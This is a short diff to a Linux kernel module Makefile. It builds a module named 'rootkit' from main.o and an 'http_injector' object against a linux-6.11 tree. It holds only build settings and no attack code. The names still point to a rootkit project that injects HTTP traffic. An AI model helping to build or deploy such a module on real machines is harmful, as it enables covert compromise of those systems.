@@ -1,4 +1,5 @@
-obj-m += rootkit.o
+obj-m := rootkit.o
+rootkit-objs := main.o http_injector.o
 
 KDIR 		:= $(PWD)/../linux-6.11
 SRC_DIR		:= $(PWD)/src
